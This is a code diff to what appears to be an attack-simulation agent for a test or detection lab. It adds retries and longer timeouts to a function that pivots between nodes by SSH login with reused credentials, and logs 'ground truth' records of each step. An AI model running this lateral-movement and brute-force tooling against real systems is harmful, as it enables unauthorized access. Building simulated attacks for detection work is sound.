@@ -127,29 +127,53 @@ def run_brute_force(target_ip: str, username: str = "admin") -> bool:
 
 def run_lateral_movement(source_ip: str, target_ip: str,
                           found_username: str = "admin",
-                          found_password: str = "admin123") -> bool:
+                          found_password: str = "admin123",
+                          max_retries: int = 3) -> bool:
     source_node = NODE_IPS.get(source_ip, source_ip)
     target_node = NODE_IPS.get(target_ip, target_ip)
     print(f"[attack-agent] starting lateral_movement: pivoting from {source_node} "
           f"to {target_node} using credentials found on {source_node}")
 
     succeeded = False
-    try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(target_ip, username=found_username, password=found_password, timeout=5)
-        succeeded = True
-        client.close()
-    except paramiko.AuthenticationException:
-        succeeded = False
-    except Exception as e:
-        print(f"[attack-agent] lateral_movement connection error: {e}")
-        succeeded = False
+    last_error = None
+
+    for attempt in range(1, max_retries + 1):
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(
+                target_ip,
+                username=found_username,
+                password=found_password,
+                timeout=10,
+                banner_timeout=15,
+                auth_timeout=10,
+            )
+            succeeded = True
+            client.close()
+            break
+        except paramiko.AuthenticationException:
+            succeeded = False
+            last_error = "auth_failed"
+            break  # this is the expected outcome, no real account exists -- don't retry
+        except paramiko.SSHException as e:
+            last_error = f"ssh_error:{e}"
+            print(f"[attack-agent] lateral_movement attempt {attempt}/{max_retries} "
+                  f"hit SSH error: {e} -- retrying" if attempt < max_retries else
+                  f"[attack-agent] lateral_movement attempt {attempt}/{max_retries} "
+                  f"hit SSH error: {e} -- giving up")
+            if attempt < max_retries:
+                time.sleep(2)
+        except Exception as e:
+            last_error = f"connection_error:{e}"
+            print(f"[attack-agent] lateral_movement connection error: {e}")
+            break
 
     log_ground_truth(
         stage="lateral_movement",
         target=target_node,
-        detail=f"pivoted_from={source_node} username={found_username} succeeded={succeeded}",
+        detail=f"pivoted_from={source_node} username={found_username} "
+               f"succeeded={succeeded} last_error={last_error}",
     )
     return succeeded
 
